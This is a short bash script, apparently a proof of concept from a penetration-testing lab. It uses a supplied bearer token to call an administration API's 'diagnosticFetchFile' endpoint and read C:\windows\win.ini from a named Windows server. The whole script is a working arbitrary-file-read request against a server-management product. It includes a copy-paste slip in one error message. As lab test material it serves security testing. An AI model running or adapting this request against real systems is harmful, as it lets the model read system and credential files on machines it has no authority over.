#!/bin/bash

if [[ ! -v JWT ]]; then
  echo "Set 'JWT' environment var with you current JWT"
  exit -1
fi

if [[ ! -v DES_NAME ]]; then
  echo "Set 'DES_NAME' environment var with you current JWT"
  exit -1
fi

HOST="192.168.60.10"
PORT=4568
URL_HOST="${HOST}:${PORT}"
#DES_NAME="packer-win2019.pentest.lab"

echo "Download file from DES (name: ${DES_NAME}) C:\windows\win.ini"


curl --path-as-is -i -s -k -X $'GET' \
    -H "Host: ${URL_HOST}" -H $'Accept: */*' -H $'Accept-Encoding: ' -H $'Connection: keep-alive' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' -H "Authorization: Bearer ${JWT}" \
    "https://${URL_HOST}/api/administration/infrastructure/diagnosticFetchFile/${DES_NAME}/1/C:\windows\win.ini/629605"